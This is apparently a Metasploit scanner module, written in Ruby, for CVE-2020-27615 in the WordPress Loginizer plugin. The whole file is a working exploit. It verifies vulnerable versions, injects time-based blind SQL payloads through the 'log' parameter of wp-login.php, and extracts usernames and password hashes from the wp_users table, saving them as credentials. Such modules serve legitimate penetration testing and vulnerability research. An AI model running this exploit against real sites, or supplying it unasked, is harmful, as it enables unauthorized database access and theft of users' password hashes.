##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi
  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Loginizer log SQLi Scanner',
        'Description' => %q{
          Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in
          versions before 1.6.4.  The vulnerable parameter is in the log parameter.
          Wordpress has forced updates of the plugin to all servers
        },
        'Author' => [
          'h00die', # msf module
          'red0xff', # sqli help
          'mslavco' # discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],
          ['CVE', '2020-27615'],
          ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],
          ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-10-21'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])
    ]
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    wp_ver = wordpress_version
    if wp_ver.nil?
      vprint_error('Unable to determine wordpress version, check settings.')
      return
    end

    if Rex::Version.new(wp_ver) < Rex::Version.new('5.4')
      vprint_error("Wordpress (core) #{wp_ver} is unexploitable.  Version 5.4+ required.")
      return
    end

    checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error('Loginizer version not vulnerable')
      return
    else
      print_good('Vulnerable version detected')
    end

    cookie = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-login.php')
    })
    if cookie.nil?
      print_error('Unable to retrieve wordpress cookie, check settings.')
      return
    end
    cookie = cookie.get_cookies
    password = Rex::Text.rand_text_alpha(10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      if payload.include?('<')
        payload.gsub!(/<>/, '=')
        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { "0,#{Regexp.last_match(1)}" }
      end
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
        'cookie' => cookie,
        'vars_post' => {
          'log' => "',ip=LEFT(UUID(),8),url=#{payload}#",
          'pwd' => password,
          'wp-submit' => 'Login',
          'redirect_to' => '',
          'testcookie' => '1'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end

    columns = ['user_login', 'user_pass']
    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    results.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good(table.to_s)
  end
end
